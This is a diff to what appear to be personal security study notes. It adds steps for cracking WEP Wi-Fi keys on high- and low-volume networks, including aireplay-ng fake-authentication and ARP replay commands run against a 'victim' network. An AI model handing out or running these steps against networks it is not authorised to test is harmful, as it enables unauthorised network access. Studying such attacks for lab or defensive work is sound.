@@ -58,11 +58,23 @@ ___
 
 ### Cracking  and Connecting to a WEP Wifi Network
 
-- In order to crack a WEP, we need a large ammount of packets or a high volume network.
+##### High Volume WEP Wifi Network Cracking
+- In order to crack a WEP, we need a large ammount of packets from a high volume network.
 
-- run aircrack-ng with the .cap file to crack the key
+- Run aircrack-ng with the .cap file to crack the key
 
    `aircrack-ng <name of .cap file>` 
 
+##### Low Volume WEP Wifi Network Cracking
+- Utilize airodump-ng to sniff packets on the victum network as seen above.
+
+- To associate your device to the network utilize aireplay-ng by running the command
+
+   `aireplay-ng --fakeauth 0 -a <Router MAC> -h <Your Device unspec> <device name>` 
+
+- Run an ARP Attack on the network by running the command
+   `aireplay-ng --arpreplay -b <Router MAC> -h <Your Device unspec> <device name>`
+
+- Run aircrackpng with the .cap file similar to above to crack the key
 ___
 
